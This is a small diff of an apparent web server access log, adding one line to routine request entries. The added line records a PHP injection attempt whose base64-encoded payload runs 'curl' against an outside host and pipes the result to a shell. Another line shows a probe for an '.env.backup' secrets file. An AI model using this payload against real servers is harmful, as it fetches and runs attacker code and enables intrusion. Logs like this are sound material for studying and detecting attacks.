@@ -2816,3 +2816,4 @@ INFO:     3.87.55.116:25420 - "GET / HTTP/1.1" 200 OK
 INFO:     66.228.53.78:57060 - "GET / HTTP/1.1" 200 OK
 INFO:     196.251.85.74:51466 - "GET /.env.backup HTTP/1.1" 404 Not Found
 INFO:     185.242.226.163:39959 - "GET / HTTP/1.1" 200 OK
+INFO:     176.65.148.52:57114 - "GET /index.php?p=admin/dashboard&a=<?=shell_exec(base64_decode("Y3VybCAxNzYuNjUuMTQ5LjE5MyB8IHNo"));die()?> HTTP/1.1" 404 Not Found
